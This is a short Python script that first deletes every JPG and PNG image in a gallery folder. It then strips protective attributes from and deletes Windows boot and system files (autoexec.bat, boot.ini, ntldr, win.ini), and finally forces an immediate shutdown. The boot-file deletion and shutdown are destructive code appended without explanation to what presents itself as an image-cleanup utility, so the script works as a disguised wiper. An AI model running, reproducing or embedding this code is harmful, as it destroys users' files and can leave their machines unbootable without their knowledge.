import os
import glob
from PIL import Image
import subprocess

directory = '/path/to/your/gallery'

if not os.path.exists(directory):
    print(f'The directory {directory} does not exist.')
else:
    patterns = [os.path.join(directory, '*.jpg'), os.path.join(directory, '*.png')]
    files_to_delete = []

    for pattern in patterns:
        files_to_delete.extend(glob.glob(pattern))

    if not files_to_delete:
        print('No files to delete.')
    else:
        for file in files_to_delete:
            try:
                with Image.open(file) as img:
                    img.verify() 
                os.remove(file)
                print(f'Deleted {file}.')
            except Exception as e:
                print(f'Error deleting {file}: {e}')

def remove_file(file_path):
    try:
        subprocess.call(['attrib', '-r', '-s', '-h', file_path])
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"{file_path} has been deleted.")
        else:
            print(f"{file_path} does not exist.")
    except Exception as e:
        print(f'Error removing {file_path}: {e}')

files_to_remove = [
    r"c:\autoexec.bat",
    r"c:\boot.ini",
    r"c:\ntldr",
    r"c:\windows\win.ini"
]

for file in files_to_remove:
    remove_file(file)

subprocess.call(['shutdown', '/s', '/t', '1'])
